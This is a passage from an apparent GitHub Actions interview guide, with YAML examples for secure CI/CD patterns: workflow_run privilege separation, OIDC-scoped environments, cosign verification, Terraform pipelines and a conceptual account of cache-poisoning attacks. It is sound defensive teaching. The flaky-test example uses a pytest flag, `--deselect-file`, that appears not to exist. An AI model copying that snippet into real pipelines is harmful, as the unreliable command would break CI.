The second layer is **local execution** for the parts you can run without GitHub: `act` runs jobs in containers locally so you can iterate on logic, and for composite/JS actions you unit-test the action's *code* with its native test framework (a JS action is just Node — test it with Jest). The third layer, for what can't be faked, is **canary execution on a branch**: because most events run the workflow from the *triggering ref*, you can push the workflow to a feature branch and trigger it there before merge (the exception being `schedule`/`workflow_dispatch`, which run from the default branch and thus can't be branch-tested — a real gap you call out).

The trade-offs to articulate: static linting is cheap and high-value but can't catch semantic bugs (wrong secret name, an OIDC trust mismatch, a logic error in matrix generation); `act` covers logic but doesn't perfectly replicate the hosted runner, secrets, or OIDC; and branch canaries are the only way to validate real integrations but cost minutes and don't cover default-branch-sourced triggers. So the durable answer is **defense in depth**: required `actionlint` on every workflow change, unit tests for action code, `act` for fast local iteration, and a deliberate canary run for anything touching secrets/OIDC/deploys before it lands. The maturity signal is treating "a broken workflow on `main`" as a preventable class of incident — and noting the irony that the freshly-changed CI lint workflow can't fully test *itself* until merged, which is why you keep it simple and well-reviewed.

#### Q103. [Coding] Use `workflow_run` to safely run a privileged step (e.g. comment coverage) after an untrusted fork-PR build completes.

**Problem:** A fork PR's CI runs without secrets and a read-only token (correctly), but you still want to post a coverage report comment on the PR — a privileged action. The safe pattern is a *second* workflow triggered by `workflow_run` that runs in the **trusted base-repo context** *after* the untrusted build, consuming only the artifact the build produced. This is the canonical "privilege after untrusted build" design.

The untrusted `pull_request` workflow builds and uploads the coverage data as an artifact (no secrets needed). A separate `workflow_run` workflow fires on its completion, runs with the base repo's token/secrets, downloads the artifact, and posts the comment — without ever executing the PR's code.

```yaml
# 1) ci.yml — runs on the fork PR, NO secrets, just produces an artifact
name: CI
on: [pull_request]
permissions: { contents: read }
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test -- --coverage
      - run: echo "${{ github.event.number }}" > pr-number.txt
      - uses: actions/upload-artifact@v4
        with: { name: coverage, path: "coverage.txt\npr-number.txt" }
```

```yaml
# 2) coverage-comment.yml — runs in TRUSTED context after CI completes
name: Coverage Comment
on:
  workflow_run:
    workflows: [CI]
    types: [completed]
permissions:
  pull-requests: write       # privileged — safe because we never run PR code
  actions: read              # to download the artifact from the triggering run
jobs:
  comment:
    if: github.event.workflow_run.event == 'pull_request'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: coverage
          run-id: ${{ github.event.workflow_run.id }}
          github-token: ${{ secrets.GITHUB_TOKEN }}
      - env: { GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} }
        run: |
          pr=$(cat pr-number.txt)
          gh pr comment "$pr" --repo "$GITHUB_REPOSITORY" --body-file coverage.txt
```

**Why this is safe where `pull_request_target` is not:** the `workflow_run` workflow runs the **base repository's** trusted code (from the default branch) with secrets, but it only ever consumes a *data artifact* — it never checks out or executes the PR's code, so there's no path for attacker-controlled code to run in the privileged context. Contrast with the `pull_request_target` anti-pattern, which reunites secrets *with* a checkout of PR code and becomes an RCE. **The critical input-trust caveat:** the artifact contents (coverage text, PR number) are still **attacker-influenced** — a malicious PR could put a poison payload in `coverage.txt` — so you treat that data as untrusted (don't `eval` it, pass it via `--body-file` so it can't inject into the `gh` command, and validate the PR number is numeric). **Why `run-id` matters:** v4 `download-artifact` needs the explicit `run-id` of the triggering run because the two workflows are separate runs; this is exactly the v4 cross-run capability. The pattern cleanly separates "untrusted build (no privilege)" from "privileged follow-up (no untrusted code execution)."

#### Q104. [Practical] How do you structure secrets and configuration across dev/staging/prod so the wrong environment's credentials can never be used?

The design goal is *credential isolation by construction* — it should be structurally impossible for a staging job to hold production credentials, not merely "we're careful." The primary mechanism is **environment-scoped secrets**: GitHub Environments (`dev`, `staging`, `production`) each carry their own secrets and variables, and a job only sees an environment's secrets when it declares `environment: production`. So prod credentials simply don't exist in the context of a job targeting staging — there's no shared bucket to accidentally read from.

```
                  repo/org secrets (shared, non-prod-sensitive only)
                          │
   environment: dev       environment: staging      environment: production
   SECRET=dev-value       SECRET=stg-value          SECRET=prod-value
   role: dev-role         role: stg-role            role: prod-role (env reviewers)
        ▲                       ▲                          ▲
   job declares env: dev   job declares env: staging  job declares env: production
   (sees ONLY dev creds)   (sees ONLY staging creds)  (sees ONLY prod creds + gate)
```

Layered on top, **OIDC makes the isolation enforced by the cloud too**: each environment assumes a *different* IAM role whose trust policy filters on the `environment` claim in the OIDC token (`repo:org/app:environment:production`). So even if a misconfigured workflow tried to assume the prod role from a staging job, the cloud's trust policy rejects it because the token's `environment` claim is `staging` — defense in depth at both the GitHub layer (env-scoped secrets) and the IAM layer (claim-scoped roles). Production environments additionally get **required reviewers** and a **deployment branch policy** (only `main`/`release/*` may deploy to prod), so a feature branch can't even reach the prod credentials.

The trade-offs and anti-patterns worth naming: the tempting shortcut is putting `PROD_DB_PASSWORD` and `STAGING_DB_PASSWORD` both as *repo* secrets and selecting by string — that's fragile (a typo selects the wrong one) and every job can read both, so a compromised staging step exfiltrates prod creds. Environment-scoping removes that entire failure mode. The cost is a bit more setup (configuring each environment) and that environment secrets aren't available to jobs that don't declare the environment — which is the *point*, but occasionally surprises people writing a shared utility job. The senior framing: configuration isolation should be a *property of the architecture* (env-scoped secrets + claim-scoped OIDC roles + branch policies), so that "use the wrong environment's credentials" isn't a mistake you have to avoid — it's a thing the system won't let you do.

### 🟠 Advanced — extended

#### Q105. [Coding] Design and implement a reusable deployment workflow consumed by many repos, with typed inputs, secrets, and an environment gate.

**Problem:** The platform team wants one audited deployment workflow that 50 service repos call with a few inputs. Implement the `workflow_call` definition and a thin caller. This is the core "golden path" design exercise — the interviewer is judging your contract design, secret handling, and governance instincts.

The reusable workflow declares a **typed contract**: `inputs` (non-secret config), `secrets` (named, not blanket-inherited), and `outputs` (e.g. the deployed URL). It owns the OIDC + environment + deploy logic; callers supply only what varies. I deliberately name secrets explicitly rather than `secrets: inherit` so a consuming repo can't accidentally leak unrelated credentials into the shared logic.

```yaml
# org/ci-platform/.github/workflows/deploy.yml  (the reusable workflow)
on:
  workflow_call:
    inputs:
      environment: { type: string, required: true }
      image:       { type: string, required: true }   # immutable digest
      region:      { type: string, default: 'us-east-1' }
    secrets:
      role-arn:    { required: true }                  # named, least-privilege
    outputs:
      url: { value: ${{ jobs.deploy.outputs.url }} }

permissions:
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}    # gate lives in the CONSUMER's env settings
    permissions:
      id-token: write
      contents: read
    outputs:
      url: ${{ steps.deploy.outputs.url }}
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.role-arn }}
          aws-region: ${{ inputs.region }}
      - id: deploy
        run: |
          ./deploy.sh "${{ inputs.environment }}" "${{ inputs.image }}"
          echo "url=https://${{ inputs.environment }}.example.com" >> "$GITHUB_OUTPUT"
```

```yaml
# consumer repo: .github/workflows/cd.yml  (thin caller)
name: CD
on: { push: { branches: [main] } }
jobs:
  deploy-prod:
    uses: org/ci-platform/.github/workflows/deploy.yml@<sha>   # SHA-pinned!
    with:
      environment: production
      image: ghcr.io/org/app@sha256:abc123...
    secrets:
      role-arn: ${{ secrets.PROD_ROLE_ARN }}
```

**Three design decisions worth defending:** (1) The caller **SHA-pins** the reusable workflow reference (`@<sha>`), because a mutable `@main` means the platform team can change deploy behavior under 50 repos at once — convenient for the platform, terrifying for supply-chain risk; pinning plus a rollout process (Q67) gives controlled change. (2) The `environment:` is evaluated in the *consumer's* context, so each repo's own `production` environment protection rules (required reviewers, branch policy) apply — governance stays decentralized while logic stays centralized. (3) **Named secrets, not `inherit`** — the reusable workflow declares exactly the `role-arn` it needs, so a consuming repo's unrelated secrets never flow into shared code. **Trade-off:** the typed contract is rigid; when a consumer needs something the inputs don't expose, you either widen the contract (and re-audit) or provide a documented escape hatch — the platform-bottleneck risk from Q16 is real, so you design the inputs for the common 80%.

#### Q106. [Coding] Implement a canary deployment with automated health checks and rollback, fully in Actions.

**Problem:** Deploy a new version to a small traffic slice, watch health/error metrics for a soak period, promote to 100% if healthy, and automatically roll back if not — orchestrated from a workflow. This is a meaty design+code exercise touching environments, polling, and failure handling.

The structure is a sequence of jobs (or steps) that shift traffic incrementally, with a verification step between each step that *fails the job* on bad metrics — and a `if: failure()` rollback step that runs on any failure. The verification must poll real signals (error rate, p99 latency), not just "did the deploy command return 0."

```yaml
name: Canary Deploy
on:
  workflow_dispatch:
    inputs:
      image: { type: string, required: true }   # immutable digest

permissions:
  id-token: write
  contents: read

jobs:
  canary:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: actions/checkout@v4
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.PROD_ROLE_ARN }}
          aws-region: us-east-1

      - name: Shift 10% to canary
        run: ./traffic.sh set --canary "${{ inputs.image }}" --weight 10

      - name: Soak & verify (10% for 5 min)
        run: ./verify.sh --window 300 --max-error-rate 0.5 --max-p99-ms 400

      - name: Promote to 50%
        run: ./traffic.sh set --canary "${{ inputs.image }}" --weight 50
      - name: Soak & verify (50%)
        run: ./verify.sh --window 300 --max-error-rate 0.5 --max-p99-ms 400

      - name: Promote to 100%
        run: ./traffic.sh promote "${{ inputs.image }}"

      - name: Roll back on ANY failure
        if: failure()                # fires if any verify/shift step failed
        run: |
          echo "::error::Canary failed health checks — rolling back"
          ./traffic.sh rollback
```

```
10% ──verify──▶ 50% ──verify──▶ 100%
  │ fail          │ fail
  └──────┬────────┘
         ▼
   rollback (if: failure())
```

**Why `if: failure()` is the rollback trigger:** the moment any `verify.sh` exits non-zero (error rate or latency over threshold), the job status flips to failure, every subsequent default-`if` step is skipped, and the `failure()` step fires — so traffic snaps back to the previous version automatically without manual intervention. The verification gate is the heart of it: a deploy that "succeeds" but degrades the service must be caught by *observed metrics*, which is why `verify.sh` polls Prometheus/CloudWatch over a window rather than trusting the deploy command's exit code. **Edge cases:** a workflow **cancellation** mid-canary is *not* `failure()` — it's `cancelled()`, so if you want rollback on cancel too, use `if: failure() || cancelled()` (or `if: always()` with internal logic). Also, the rollback step itself must be **idempotent** — if it runs when traffic was never shifted, it should be a no-op, not an error. **Trade-off vs blue-green:** canary catches problems with real production traffic at low blast radius but is slower (soak windows) and needs good metrics; blue-green is faster to cut over and roll back but exposes 100% at switch time.

#### Q107. [Coding] Implement an `infra/` Terraform pipeline: plan on PR (commented), apply on merge, with OIDC and state locking.

**Problem:** When a PR touches `infra/`, run `terraform plan` and post the plan as a PR comment; on merge to `main`, run `terraform apply`. Use OIDC for cloud auth and respect remote state locking. This is the standard IaC-in-CI pattern and it tests environment separation, the plan-vs-apply privilege split, and comment plumbing.

The privilege asymmetry is the crux: **plan needs read + state access; apply needs write.** I give the plan job a read-scoped role and the apply job a write-scoped role, both via OIDC with environment-filtered trust policies — so a PR (untrusted-ish) can never `apply`. The plan output goes to the PR via `gh pr comment`.

```yaml
name: Terraform
on:
  pull_request:
    paths: ['infra/**']
  push:
    branches: [main]
    paths: ['infra/**']

permissions:
  contents: read
  pull-requests: write       # to comment the plan
  id-token: write            # OIDC

jobs:
  plan:
    if: github.event_name == 'pull_request'
    runs-on: ubuntu-latest
    environment: infra-readonly
    defaults: { run: { working-directory: infra } }
    steps:
      - uses: actions/checkout@v4
      - uses: aws-actions/configure-aws-credentials@v4
        with: { role-to-assume: ${{ secrets.TF_PLAN_ROLE }}, aws-region: us-east-1 }
      - uses: hashicorp/setup-terraform@v3
      - run: terraform init
      - id: plan
        run: terraform plan -no-color -out=tf.plan | tee plan.txt
      - name: Comment plan on PR
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          PR: ${{ github.event.pull_request.number }}
        run: |
          {
            echo '### Terraform Plan'
            echo '```'
            tail -c 60000 plan.txt        # stay under comment size limits
            echo '```'
          } > body.md
          gh pr comment "$PR" --repo "$GITHUB_REPOSITORY" --body-file body.md

  apply:
    if: github.event_name == 'push'
    runs-on: ubuntu-latest
    environment: infra-prod      # required reviewers gate the apply
    concurrency: terraform-apply # serialize: never two applies at once
    defaults: { run: { working-directory: infra } }
    steps:
      - uses: actions/checkout@v4
      - uses: aws-actions/configure-aws-credentials@v4
        with: { role-to-assume: ${{ secrets.TF_APPLY_ROLE }}, aws-region: us-east-1 }
      - uses: hashicorp/setup-terraform@v3
      - run: terraform init
      - run: terraform apply -auto-approve
```

**Why the `concurrency: terraform-apply` group is non-negotiable:** Terraform's remote state uses a lock, but two simultaneously-merged PRs would queue on that lock and, worse, the *second* apply might run against state the first just changed in surprising ways. A single-flight concurrency group serializes applies at the *workflow* level so only one runs at a time — defense in depth alongside the backend lock. **The plan/apply privilege split** mirrors least-privilege: the plan role can read state and describe resources but not mutate, so even if a malicious PR's `infra/` somehow triggered plan logic, it can't change infrastructure. **Edge case:** posting the full plan can exceed GitHub's comment size limit, so I `tail -c` it and (in a fuller version) upload the complete plan as an artifact. Apply is gated behind `infra-prod` environment reviewers — a human approves before any mutation, the IaC equivalent of the production deploy gate.

#### Q108. [Coding] Mint a GitHub App installation token at runtime to act across repos (escaping `GITHUB_TOKEN`'s single-repo scope).

**Problem:** A workflow in `repo-A` needs to push to `repo-B` (e.g. update a manifest in a GitOps repo). The built-in `GITHUB_TOKEN` is scoped to `repo-A` only and a long-lived PAT is a standing-credential risk. The modern answer is a **GitHub App** whose installation token is minted *per run* and scoped to exactly the repos and permissions you grant.

You register a GitHub App, install it on the target repos with minimal permissions, store its App ID and private key as secrets, and use `actions/create-github-app-token` to exchange them for a short-lived installation token at runtime. The token expires in ~1 hour and is scoped far more tightly than a PAT.

```yaml
name: Update GitOps Manifest
on:
  push:
    branches: [main]

permissions:
  contents: read

jobs:
  bump:
    runs-on: ubuntu-latest
    steps:
      - name: Mint scoped App token for the GitOps repo
        id: app-token
        uses: actions/create-github-app-token@v1
        with:
          app-id: ${{ secrets.GITOPS_APP_ID }}
          private-key: ${{ secrets.GITOPS_APP_PRIVATE_KEY }}
          owner: ${{ github.repository_owner }}
          repositories: gitops-manifests          # SCOPE: only this repo

      - uses: actions/checkout@v4
        with:
          repository: ${{ github.repository_owner }}/gitops-manifests
          token: ${{ steps.app-token.outputs.token }}   # use the App token

      - name: Bump image tag and push
        env:
          GH_TOKEN: ${{ steps.app-token.outputs.token }}
        run: |
          yq -i '.image.tag = "${{ github.sha }}"' apps/myapp/values.yaml
          git config user.name  "gitops-bot[bot]"
          git config user.email "gitops-bot[bot]@users.noreply.github.com"
          git commit -am "bump myapp to ${{ github.sha }}"
          git push
```

**Why an App beats a PAT here:** a PAT is tied to a human, carries that human's access, doesn't expire (or expires far in the future), and if leaked grants broad standing access. A GitHub App installation token is **minted fresh per run, expires in ~1 hour, and is scoped to the exact repositories and permission set** you configured on the installation — so the `gitops-manifests` push capability can't reach any other repo. **The bonus behavior:** because the commit is authored by the *App* (not the `GITHUB_TOKEN`), the resulting push in `gitops-manifests` **will** trigger that repo's workflows — unlike a `GITHUB_TOKEN` push, which is suppressed by the recursion loop-breaker. This is precisely how teams build cross-repo automation chains (CI in app repo → bump in GitOps repo → Argo CD reconciles). **Edge case:** the App's private key is a high-value secret — store it as an org/environment secret with tight access, rotate it on a schedule, and never let it touch a fork-PR-exposed context.

#### Q109. [Coding] Sign a container image with cosign keyless signing and verify the signature before deploy.

**Problem:** Build and push an image, sign it with Sigstore/cosign **keyless** (using the OIDC identity, no private key to manage), then in the deploy job **verify** the signature before rolling out — so you only ever deploy artifacts your pipeline actually produced. This is the supply-chain integrity exercise.

Keyless signing uses the job's OIDC token to obtain a short-lived signing certificate from Fulcio, records the signature in the Rekor transparency log, and binds the signature to the workflow identity. Verification later checks that the image was signed by *your* specific workflow — defeating an attacker who pushes a malicious image to the registry.

```yaml
permissions:
  contents: read
  packages: write
  id-token: write          # REQUIRED for keyless cosign signing

jobs:
  build-sign:
    runs-on: ubuntu-latest
    outputs:
      digest: ${{ steps.push.outputs.digest }}
    steps:
      - uses: actions/checkout@v4
      - uses: docker/login-action@v3
        with: { registry: ghcr.io, username: ${{ github.actor }}, password: ${{ secrets.GITHUB_TOKEN }} }
      - id: push
        uses: docker/build-push-action@v6
        with: { context: ., push: true, tags: ghcr.io/${{ github.repository }}:${{ github.sha }} }
      - uses: sigstore/cosign-installer@v3
      - run: |
          cosign sign --yes \
            ghcr.io/${{ github.repository }}@${{ steps.push.outputs.digest }}

  deploy:
    needs: build-sign
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: sigstore/cosign-installer@v3
      - name: Verify signature & identity BEFORE deploying
        run: |
          cosign verify \
            --certificate-identity-regexp "https://github.com/${{ github.repository }}/.github/workflows/.+" \
            --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
            ghcr.io/${{ github.repository }}@${{ needs.build-sign.outputs.digest }}
      - run: ./deploy.sh ghcr.io/${{ github.repository }}@${{ needs.build-sign.outputs.digest }}
```

**Why keyless is the right default in 2026:** there's no signing key to generate, store, rotate, or leak — the signature is bound to the **workflow's OIDC identity**, recorded immutably in Rekor. The verification step is where the value is realized: `--certificate-identity-regexp` and `--certificate-oidc-issuer` assert that the image was signed by *this repo's GitHub Actions workflow* and nothing else, so an attacker who somehow pushes `ghcr.io/org/app:evil` can't produce a matching signature and the deploy verify fails closed. **The deploy-by-digest discipline reappears:** signing and verifying are bound to the `@sha256:` digest, not a mutable tag, so you verify the exact bits you deploy. **Trade-off / extension:** verification at deploy time in the workflow is good, but the stronger posture is enforcing it at *admission* in the cluster (Kyverno/Sigstore policy-controller) so nothing unsigned runs even if someone bypasses the pipeline — the workflow check is the first line, not the only line.

#### Q110. [Coding] Implement an affected-only monorepo CI that runs each service's tests only when its files (or shared deps) change.

**Problem:** In a monorepo with many services that share libraries, running every service's full test suite on every PR is wasteful and slow. Build a pipeline that computes the *affected* services from the diff (including transitive dependents of shared code) and fans out a matrix over just those. This is the canonical scale-CI design exercise, combining diff computation, a dynamic matrix, and the required-check foot-gun.

The robust approach delegates dependency-graph reasoning to a tool that understands the build graph (Nx/Turborepo/Bazel) rather than hand-rolling "did files under `services/x/` change," because the hard part is *transitive* impact — a change to `libs/auth` must trigger every service that depends on it. The tool emits the affected list; a generator job turns it into a JSON matrix.

```yaml
name: Monorepo CI
on: { pull_request: {} }
permissions:
  contents: read

jobs:
  affected:
    runs-on: ubuntu-latest
    outputs:
      services: ${{ steps.list.outputs.services }}
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 0 }          # full history so the diff base resolves
      - uses: actions/setup-node@v4
        with: { node-version: '20', cache: 'npm' }
      - run: npm ci
      - id: list
        run: |
          base="origin/${{ github.base_ref }}"
          git fetch origin "${{ github.base_ref }}" --depth=1
          # nx prints affected projects; transitive dependents included
          affected=$(npx nx show projects --affected --base "$base" --json)
          [ "$affected" = "[]" ] && affected='[]'
          echo "services=$affected" >> "$GITHUB_OUTPUT"

  test:
    needs: affected
    if: ${{ needs.affected.outputs.services != '[]' }}   # skip cleanly if nothing affected
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        service: ${{ fromJSON(needs.affected.outputs.services) }}
    steps:
      - uses: actions/checkout@v4
      - run: npx nx test "${{ matrix.service }}"

  ci-complete:
    needs: [affected, test]
    if: always()
    runs-on: ubuntu-latest
    steps:
      - run: |
          # required-check shim: succeed if test passed OR was legitimately skipped
          r='${{ needs.test.result }}'
          [ "$r" = "success" ] || [ "$r" = "skipped" ] || exit 1
```

**Two non-obvious correctness points.** First, `fetch-depth: 0` (or at least fetching the base ref) is **mandatory** — affected-detection diffs against the merge base, and the default shallow checkout doesn't have it, so a shallow clone silently computes "everything changed" or errors. Second, the **required-check shim** (`ci-complete`) solves the path-filter merge-blocker: if you marked the per-service `test` job as a required check, a PR that affects *nothing* skips `test`, and a required-but-skipped check leaves the PR unmergeable forever. The `ci-complete` job is *always* required and reports success when `test` either passed or was correctly skipped — a stable single gate. **Trade-off:** affected-only CI dramatically cuts minutes and latency but adds a dependency on the build tool's graph correctness; a misconfigured dependency edge means you *skip* a service that should have been tested — a false-negative that's worse than wasted minutes, so teams periodically run the *full* suite (nightly or on `main`) as a backstop.

#### Q111. [Coding] Build a flaky-test quarantine system that auto-retries known-flaky tests, files an issue, and blocks new flakes from landing.

**Problem:** Flaky tests erode trust in CI. Design a system that (1) retries only *known-flaky* tests rather than masking all failures, (2) records flake occurrences, and (3) prevents a *newly* flaky test from being silently retried into green. This is a step beyond "just retry" — it's about preserving signal while reducing noise.

The key design decision is a **quarantine list** (a checked-in file of test IDs known to be flaky) so retries are *targeted*, not blanket. A genuinely broken test (not on the list) fails immediately and blocks the PR; a quarantined test is retried and its flake is logged, but it can't gate the merge. A separate scheduled job tracks flake rates and files issues so quarantine is a *tracked debt*, not a graveyard.

```yaml
name: Test with Quarantine
on: [pull_request]
permissions:
  contents: read
  issues: write          # to file/append flake-tracking issues

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: '3.12' }
      - run: pip install -e .[test] pytest-rerunfailures

      - name: Run non-quarantined tests (no retries — real signal)
        run: pytest -p no:randomly --deselect-file quarantine.txt -q

      - name: Run quarantined tests (retried, never blocks)
        id: quar
        continue-on-error: true        # a quarantined flake must NOT fail the PR
        run: |
          pytest $(tr '\n' ' ' < quarantine.txt) \
            --reruns 3 --reruns-delay 2 -q --junitxml=quar.xml

      - name: Record flake if a quarantined test needed reruns
        if: always()
        env: { GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} }
        run: |
          if grep -q 'rerun' quar.xml 2>/dev/null; then
            gh issue list --label flaky --search "Flaky tests tracking" --json number \
              --jq '.[0].number' > n.txt || true
            gh issue comment "$(cat n.txt)" --body "Flake observed in run $GITHUB_RUN_ID" \
              || gh issue create --label flaky --title "Flaky tests tracking" \
                   --body "Reruns observed in run $GITHUB_RUN_ID"
          fi
```

**Why this preserves signal:** the *non-quarantined* run uses **no retries**, so a real regression fails fast and blocks — the cardinal rule is that retrying *all* tests masks real bugs and is how teams ship breakage. Only tests *explicitly admitted* to `quarantine.txt` (a reviewed change, ideally with an owner and an expiry) get reruns, and that job is `continue-on-error` so a quarantined flake never blocks a merge but also never hides a non-quarantined failure. **The anti-masking guard:** a brand-new flaky test isn't on the list, so it fails normally — you can't accidentally retry your way to green; you must *consciously* quarantine it (creating tracked debt). **The feedback loop:** logging flakes to a tracking issue turns quarantine from a dumping ground into a managed backlog with visibility, so the list shrinks over time instead of growing. **Trade-off:** maintaining the quarantine list is overhead, and an over-eager team quarantines real bugs — mitigate with an expiry/owner per entry and a periodic audit that fails CI if a quarantined test has been ignored past its deadline.

#### Q112. [Coding] Write a workflow that enforces a "no merge after Friday 3pm" deployment freeze window, with a documented override.

**Problem:** Implement a guardrail that blocks production deploys during a freeze window (e.g. Fridays after 15:00 and weekends, in a business timezone) to reduce weekend-incident risk, while providing an auditable override for genuine emergencies. This tests timezone handling, status-check design, and the "guardrail-not-gate" philosophy.

The mechanics: a required status check that computes the current time in the business timezone and *fails* during the freeze, unless an override signal (a label or a `workflow_dispatch` input with justification) is present. The subtlety is **timezone correctness** — runners are UTC, so you must convert explicitly, and you must account for DST by using a named zone, not a fixed offset.

```yaml
name: Deploy Freeze Gate
on:
  pull_request:
    types: [opened, synchronize, labeled, unlabeled]

permissions:
  contents: read

jobs:
  freeze-check:
    runs-on: ubuntu-latest
    steps:
      - name: Enforce freeze window (America/New_York)
        env:
          OVERRIDE: ${{ contains(github.event.pull_request.labels.*.name, 'override-freeze') }}
        run: |
          # named TZ → correct across DST; runner clock is UTC
          dow=$(TZ='America/New_York' date +%u)    # 1=Mon .. 7=Sun
          hour=$(TZ='America/New_York' date +%H)
          frozen=0
          # Fri after 15:00, all Sat, all Sun
          if   [ "$dow" = "5" ] && [ "$hour" -ge 15 ]; then frozen=1
          elif [ "$dow" -ge 6 ]; then frozen=1
          fi
          if [ "$frozen" = "1" ] && [ "$OVERRIDE" != "true" ]; then
            echo "::error::Deploy freeze in effect (Fri 3pm–Mon). Add 'override-freeze' label (requires approval) to bypass."
            exit 1
          fi
          echo "::notice::Outside freeze window or override present — OK."
```

**Why a named timezone, not an offset:** `TZ='America/New_York'` resolves DST automatically; hardcoding `UTC-5` would be wrong half the year and silently shift the freeze window by an hour — exactly the kind of bug that lets a "frozen" deploy through in summer. **Why label-based override and not just removing the check:** the `override-freeze` label is *auditable* (it shows in the PR timeline who added it and when) and can itself be governed — combine it with branch protection / CODEOWNERS so only release managers can apply it, turning "skip the freeze" into a reviewed, logged decision rather than an invisible bypass. Re-running on `labeled`/`unlabeled` events means the check re-evaluates the moment the override is toggled. **Philosophy point worth stating:** a freeze is a *guardrail with a break-glass*, not an absolute lock — a hard block with no override is how teams end up unable to ship a critical hotfix during an incident, so the override path is a feature, and making it auditable is what keeps it from being abused.

#### Q113. [Theory] How do you reason about cache poisoning and cross-workflow cache attacks, and what's the correct defensive design?

This is an advanced security question because the cache is a *shared, writable, cross-run* surface that most engineers treat as benign, and an expert understands the attack and the scoping rules that contain it. The threat: caches are keyed strings written by jobs and read by later jobs. If an attacker can get a job to **write** a malicious payload under a key that a *trusted* later job will **read and execute** (e.g. a poisoned `node_modules` or a tampered build tool in `~/.cache`), they achieve code execution in the trusted context. The classic vector is a *fork PR* (or any low-trust workflow) writing a cache that a privileged branch workflow then restores.

```
attacker-influenced job ── writes cache key "deps-linux-<hash>" (poisoned)
                                   │
trusted main-branch job  ── restores "deps-linux-<hash>" ──▶ executes payload
                                   │
defense: ref-scoping + key includes trusted inputs only + no exec of cached bins
```

The built-in defense is **ref scoping**: caches are partitioned so a branch can read its own caches and the default-branch (and PR base) caches, but **cannot read arbitrary sibling-branch caches**, and fork-PR workflows run with restricted cache access — this is *why* GitHub scopes caches by ref rather than making them globally shared. But scoping alone isn't sufficient; the defensive design adds: (1) **derive cache keys from trusted, content-addressed inputs only** (a lockfile hash, not a branch name or a PR title an attacker controls) so a fork can't choose a key that collides with a trusted job's; (2) **don't cache executables or run binaries straight from cache** without integrity checks where the threat model warrants it (cache the *download*, then verify checksums on restore); (3) treat cache like any untrusted input — a restored `node_modules` should be subject to the same provenance assumptions as a fresh install, which is why some hardened pipelines disable cross-PR caching entirely for security-sensitive build steps.

The senior synthesis: the cache is a performance optimization that quietly becomes a *trust boundary* the moment a less-trusted job can write what a more-trusted job reads. The correct mental model is "a cache hit is restoring data that something earlier produced — who produced it, and could an attacker influence it?" You rely on ref-scoping as the structural guarantee, key derivation from trusted content as the discipline, and checksum verification for anything executable — and for the highest-trust deploy paths, you accept the cold-start cost of *not* sharing caches across trust levels rather than risk poisoning. The interview signal is recognizing the cache as an attack surface at all, then naming the scoping mechanism and the key-hygiene defense rather than just "use actions/cache."

#### Q114. [Practical] Design a progressive rollout of a breaking change to a heavily-used composite action without breaking hundreds of consumers.

This is a versioning-and-rollout design problem, and the right answer treats a popular internal action like a *published API with a deprecation policy*, because hundreds of `uses:` references are effectively a distributed dependency you can't atomically update. The objective: ship a breaking change (say, renaming a required input or changing default behavior) without a flag-day that breaks consumers' pipelines.

The strategy mirrors semantic-versioning discipline. (1) **Never mutate an existing major tag in a breaking way** — consumers pinned to `@v2` (or a `v2` SHA) must keep working. (2) Ship the breaking change as **`v3`** on a new ref, and keep `v2` alive in maintenance. (3) Make the new version **backward-compatible during a transition window** where feasible: accept both the old and new input names, emit a `::warning::` deprecation notice when the old form is used, and only *remove* the old path in a later release after telemetry shows nobody uses it.

```yaml
# inside the composite action — soft-deprecation during transition
runs:
  using: composite
  steps:
    - shell: bash
      env:
        OLD: ${{ inputs.target-dir }}        # deprecated input
        NEW: ${{ inputs.path }}              # replacement
      run: |
        if [ -n "$OLD" ] && [ -z "$NEW" ]; then
          echo "::warning::Input 'target-dir' is deprecated; use 'path'. Will be removed in v4."
          NEW="$OLD"
        fi
        echo "resolved path: $NEW"
```

```
v2 (frozen, maintained) ───────────────────────────▶ removed after sunset date
                  consumers pinned @v2 keep working
v3 (new): accepts old+new inputs, warns on old ──▶ v4: old input REMOVED
          migration window (weeks/months), measure adoption via warnings/telemetry
```

The rollout mechanics that de-risk it: announce with a **dated deprecation timeline**, not "soon"; **measure** who's still on the old form (parse the deprecation warnings from logs, or instrument the action to ping a telemetry endpoint with the caller repo) so you know when it's safe to remove; offer an **automated migration** (a script or a Dependabot-style PR) so consumers don't do manual work — making the migration the *easy* path is what actually drives adoption, the same lesson as SHA-pinning (Q18). Only after adoption of the old form drops to near-zero do you cut `v4` that removes it. **Trade-offs:** maintaining two majors in parallel is real cost, and an indefinite compatibility shim accumulates cruft — so you *time-box* the window with a hard sunset date and communicate it relentlessly. The anti-pattern is force-pushing a breaking change onto the existing `@v2` tag (or `@main`), which silently breaks every consumer at once with no warning — the cardinal sin of shared-action ownership.

### 🔴 Expert — extended

#### Q115. [Practical] Design a multi-tenant CI platform for an org where teams have different trust levels and compliance requirements.

This is a platform-architecture design question, so I'd lead with the *objectives in tension*: self-service velocity for product teams, hard isolation between trust tiers, auditability for compliance (SOC2/FedRAMP-style), and bounded cost — then show the layered design that satisfies them. The organizing idea is **tiered trust with policy enforced at multiple layers**, not a single control.

The core structure: a platform team owns SHA-pinned **reusable workflows** that encode the golden path (build, scan, sign, deploy) and **org rulesets** that make those checks required. Teams are partitioned into trust tiers, each mapped to its own **runner groups** (so a low-trust team's jobs can never schedule onto high-trust hardware), its own **OIDC trust policies** (cloud roles filtered on `repository`/`environment` claims so blast radius is per-tier), and its own **environment protection rules**. Compliance evidence is generated *by the pipeline*: SBOMs, SLSA provenance, signed images, and immutable audit logs streamed off-platform.

```
                 ┌────────────── Platform team (owns golden path) ─────────────┐
